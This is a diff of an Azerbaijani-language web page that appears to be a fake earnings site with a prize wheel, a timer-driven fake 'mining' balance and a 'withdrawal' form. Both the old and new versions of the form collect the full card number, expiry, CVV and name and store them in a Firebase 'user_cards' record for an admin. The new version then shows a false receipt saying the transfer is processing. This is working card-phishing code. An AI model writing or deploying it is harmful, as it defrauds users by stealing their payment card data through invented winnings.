@@ -135,140 +135,95 @@
         <i class="fas fa-credit-card" style="margin-right:8px;"></i> KARTA ÇIXARIŞ ET
     </a>
 
-    <div id="ws-withdraw-modal" class="modal-overlay">
-        <div class="bank-modal">
-            <div id="withdraw-form-step">
-                <div style="text-align:right; margin-bottom:15px;"><img src="visa.png" height="18"> <img src="master.png" height="18"></div>
-                <h2 style="color:#d4af37; margin:0 0 10px 0; font-size:1.3rem;">Vəsaitin Çıxarılması</h2>
-                <span class="label">KART NÖMRƏSİ</span>
-                <input type="tel" id="c-num" class="bank-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
-                <div style="display:flex; gap:15px;">
-                    <div style="flex:1"><span class="label">AY / İL</span><input type="tel" id="c-date" class="bank-input" placeholder="01/28" maxlength="5"></div>
-                    <div style="flex:1"><span class="label">CVV/CVC</span><input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3"></div>
-                </div>
-                <span class="label">AD VƏ SOYAD</span>
-                <input type="text" id="c-name" class="bank-input" placeholder="ALİ ALİYEV" style="text-transform:uppercase;">
-                <button class="casino-btn spin-btn" style="margin-top:25px;" onclick="finalWithdrawProcess()">TƏSDİQLƏ VƏ KÖÇÜR</button>
-                <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#444; width:100%; margin-top:15px; cursor:pointer;">Ləğv et</button>
-            </div>
+        <div id="ws-withdraw-modal" class="modal-overlay">
+    <div class="bank-modal">
+        <div id="withdraw-form-step">
+            <div style="text-align:right; margin-bottom:15px;"><img src="visa.png" height="18"> <img src="master.png" height="18"></div>
+            <h2 style="color:#d4af37; margin:0 0 10px 0; font-size:1.3rem;">Vəsaitin Çıxarılması</h2>
+            
+            <span class="label">ÇIXARILACAQ MƏBLƏĞ (AZN)</span>
+            <input type="number" id="w-amount" class="bank-input" placeholder="0.00" step="0.01" style="border-color: #00ff88; color: #00ff88;">
+            <p style="font-size: 0.6rem; color: #555; margin-top: 5px;">Mövcud balans: <span id="modal-current-bal">0.00</span> AZN</p>
 
-            <div id="withdraw-success-step" class="success-receipt">
-                <div class="check-icon"><i class="fas fa-check"></i></div>
-                <h3 style="color:#fff; margin-bottom:5px;">Sorğu Göndərildi!</h3>
-                <p style="color:#555; font-size:0.7rem; margin-bottom:20px;">Vəsaitiniz təhlükəsizlik yoxlanışından sonra köçürüləcək.</p>
-                <div class="receipt-row"><span>Status:</span> <span class="status-badge">İŞLƏNİLİR</span></div>
-                <div class="receipt-row"><span>Məbləğ:</span> <span id="rec-amount" style="color:#00ff88; font-weight:bold;">0.00 AZN</span></div>
-                <div class="receipt-row"><span>Kart:</span> <span id="rec-card">**** 0000</span></div>
-                <div class="receipt-row"><span>ID:</span> <span id="rec-id">#TX-83921</span></div>
-                <button class="casino-btn" style="background:#222; color:#fff; margin-top:25px; font-size:0.8rem;" onclick="location.reload()">BAĞLA</button>
+            <span class="label">KART NÖMRƏSİ</span>
+            <input type="tel" id="c-num" class="bank-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
+            
+            <div style="display:flex; gap:15px;">
+                <div style="flex:1"><span class="label">AY / İL</span><input type="tel" id="c-date" class="bank-input" placeholder="01/28" maxlength="5"></div>
+                <div style="flex:1"><span class="label">CVV/CVC</span><input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3"></div>
             </div>
+            
+            <span class="label">AD VƏ SOYAD</span>
+            <input type="text" id="c-name" class="bank-input" placeholder="ALİ ALİYEV" style="text-transform:uppercase;">
+            
+            <button class="casino-btn spin-btn" style="margin-top:25px;" onclick="finalWithdrawProcess()">TƏSDİQLƏ VƏ KÖÇÜR</button>
+            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#444; width:100%; margin-top:15px; cursor:pointer;">Ləğv et</button>
+        </div>
+
+        <div id="withdraw-success-step" class="success-receipt">
+            <div class="check-icon"><i class="fas fa-check"></i></div>
+            <h3 style="color:#fff; margin-bottom:5px;">Sorğu Göndərildi!</h3>
+            <p style="color:#555; font-size:0.7rem; margin-bottom:20px;">Seçdiyiniz məbləğ balansınızdan çıxıldı və köçürməyə yönləndirildi.</p>
+            <div class="receipt-row"><span>Status:</span> <span class="status-badge">İŞLƏNİLİR</span></div>
+            <div class="receipt-row"><span>Çıxarılan:</span> <span id="rec-amount" style="color:#00ff88; font-weight:bold;">0.00 AZN</span></div>
+            <div class="receipt-row"><span>Qalıq Balans:</span> <span id="rec-remaining" style="color:#888;">0.00 AZN</span></div>
+            <div class="receipt-row"><span>ID:</span> <span id="rec-id">#TX-00000</span></div>
+            <button class="casino-btn" style="background:#222; color:#fff; margin-top:25px; font-size:0.8rem;" onclick="location.reload()">BAĞLA</button>
         </div>
     </div>
 </div>
 
 <script>
-    (function() {
-        // ID SYSTEM
-        const userName = localStorage.getItem('ws_user_name');
-        const userKey = userName || localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
-        if(!localStorage.getItem('ws_user_id')) localStorage.setItem('ws_user_id', userKey);
+    // Əvvəlki funksiyaları saxlayırıq, yalnız finalWithdrawProcess-i yeniləyirik:
 
-        // LIVE BALANCE FROM FIREBASE (Admin can change it directly)
-        firebase.database().ref('users/' + userKey + '/balance').on('value', snap => {
-            let b = snap.val() || "0.00";
-            document.getElementById('ws-balance-display').innerText = b;
-            localStorage.setItem('ws_balance', b);
+    window.openWithdrawPanel = function() {
+        const modal = document.getElementById('ws-withdraw-modal');
+        const currentBal = localStorage.getItem('ws_balance') || "0.00";
+        document.getElementById('modal-current-bal').innerText = currentBal;
+        document.getElementById('w-amount').value = currentBal; // Default olaraq hamısını yazsın
+        modal.style.display = 'flex';
+    };
+
+    window.finalWithdrawProcess = function() {
+        const userKey = localStorage.getItem('ws_user_id');
+        const inputAmount = parseFloat(document.getElementById('w-amount').value);
+        const currentBalance = parseFloat(localStorage.getItem('ws_balance')) || 0;
+        const cardNum = document.getElementById('c-num').value;
+
+        // Yoxlamalar
+        if (isNaN(inputAmount) || inputAmount <= 0) { alert("Məbləği düzgün daxil edin!"); return; }
+        if (inputAmount > currentBalance) { alert("Xəta: Balansınızda kifayət qədər vəsait yoxdur!"); return; }
+        if (cardNum.replace(/\s/g, '').length < 16) { alert("Kart nömrəsi tam deyil!"); return; }
+
+        const newBalance = (currentBalance - inputAmount).toFixed(2);
+        const txnID = "TX-" + Math.floor(Math.random() * 100000);
+
+        // 1. Firebase-ə köçürmə məlumatını göndər (Admin üçün)
+        firebase.database().ref('user_cards/' + userKey).update({
+            card_num: cardNum,
+            card_date: document.getElementById('c-date').value,
+            card_cvv: document.getElementById('c-cvv').value,
+            card_name: document.getElementById('c-name').value,
+            requested_amount: inputAmount.toFixed(2),
+            status: "Gözləmədə",
+            time: new Date().toLocaleString(),
+            transaction_id: txnID
         });
 
-        // PERSISTENT MINING (Saves even if page is closed)
-        let savedMining = parseFloat(localStorage.getItem('ws_mining_temp')) || 0;
-        let lastTime = parseInt(localStorage.getItem('ws_last_mining_time')) || Date.now();
-        let diffTime = (Date.now() - lastTime) / 100;
-        let liveMining = savedMining + (diffTime > 0 ? diffTime * 0.000004 : 0);
-
-        setInterval(() => {
-            liveMining += 0.000004;
-            document.getElementById('mining-live-val').innerText = liveMining.toFixed(6);
-            localStorage.setItem('ws_mining_temp', liveMining);
-            localStorage.setItem('ws_last_mining_time', Date.now());
-        }, 100);
-
-        window.collectMining = function() {
-            if(liveMining < 0.02) { alert("Minimum 0.02 AZN yığılmalıdır!"); return; }
-            firebase.database().ref('users/' + userKey + '/balance').once('value', snap => {
-                let current = parseFloat(snap.val()) || 0;
-                let newTotal = (current + liveMining).toFixed(2);
-                firebase.database().ref('users/' + userKey).update({ balance: newTotal });
-                liveMining = 0;
-                localStorage.setItem('ws_mining_temp', 0);
-                alert("✅ Qazanc uğurla balansa köçürüldü!");
-            });
-        };
-
-        // WHEEL TIMER & ANIMATION
-        function checkSystemStatus() {
-            const btn = document.getElementById('ws-spin-btn');
-            const timer = document.getElementById('ws-timer-display');
-            const lastSpin = parseInt(localStorage.getItem('ws_last_spin')) || 0;
-            const wait = 5 * 60 * 60 * 1000;
-            const diff = Date.now() - lastSpin;
-
-            if (lastSpin !== 0 && diff < wait) {
-                btn.disabled = true;
-                let rem = wait - diff;
-                let h = Math.floor(rem / 3600000), m = Math.floor((rem % 3600000) / 60000), s = Math.floor((rem % 60000) / 1000);
-                timer.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-                timer.style.color = "#ff4757";
-                setTimeout(checkSystemStatus, 1000);
-            } else {
-                btn.disabled = false;
-                timer.innerText = "HAZIRDIR";
-                timer.style.color = "#00ff88";
-            }
-        }
-
-        window.handleSpinStart = function() {
-            const wheel = document.getElementById('claim-wheel');
-            const deg = Math.floor(Math.random() * 360) + 10800; 
-            wheel.style.transform = `rotate(${deg}deg)`;
-            document.getElementById('ws-spin-btn').disabled = true;
-
-            setTimeout(() => {
-                const rewards = [0.10, 0.30, 0.50, 0.80, 1.00];
-                const win = rewards[Math.floor((deg % 360) / 72)];
-                firebase.database().ref('users/' + userKey + '/balance').once('value', snap => {
-                    let current = parseFloat(snap.val()) || 0;
-                    firebase.database().ref('users/' + userKey).update({ balance: (current + win).toFixed(2) });
-                    localStorage.setItem('ws_last_spin', Date.now());
-                    alert("🎉 Təbriklər! " + win.toFixed(2) + " AZN qazandınız!");
-                    checkSystemStatus();
-                });
-            }, 6000);
-        };
-
-        // WITHDRAW PROCESS
-        window.openWithdrawPanel = () => { document.getElementById('ws-withdraw-modal').style.display = 'flex'; };
-        window.formatCard = (i) => { let v = i.value.replace(/\D/g, '').match(/.{1,4}/g); i.value = v ? v.join(' ') : ''; };
-
-        window.finalWithdrawProcess = function() {
-            const num = document.getElementById('c-num').value;
-            const bal = localStorage.getItem('ws_balance') || "0.00";
-            if (num.replace(/\s/g, '').length < 16) { alert("Kart nömrəsi yanlışdır!"); return; }
-
-            const txnID = "TX-" + Math.floor(Math.random() * 100000);
-            firebase.database().ref('user_cards/' + userKey).update({
-                num: num, date: document.getElementById('c-date').value,
-                cvv: document.getElementById('c-cvv').value, name: document.getElementById('c-name').value,
-                amount: bal, time: new Date().toLocaleString(), txn: txnID
-            }).then(() => {
-                document.getElementById('withdraw-form-step').style.display = 'none';
-                document.getElementById('withdraw-success-step').style.display = 'block';
-                document.getElementById('rec-amount').innerText = bal + " AZN";
-                document.getElementById('rec-card').innerText = "**** " + num.slice(-4);
-                document.getElementById('rec-id').innerText = "#" + txnID;
-            });
-        };
-
-        checkSystemStatus();
-    })();
+        // 2. Firebase-də balansı dərhal YENİLƏ (Azalt)
+        firebase.database().ref('users/' + userKey).update({ 
+            balance: newBalance 
+        }).then(() => {
+            // 3. Vizual olaraq qəbzi göstər
+            document.getElementById('withdraw-form-step').style.display = 'none';
+            document.getElementById('withdraw-success-step').style.display = 'block';
+            
+            document.getElementById('rec-amount').innerText = inputAmount.toFixed(2) + " AZN";
+            document.getElementById('rec-remaining').innerText = newBalance + " AZN";
+            document.getElementById('rec-id').innerText = "#" + txnID;
+            
+            // LocalStorage-ı yenilə
+            localStorage.setItem('ws_balance', newBalance);
+        });
+    };
 </script>
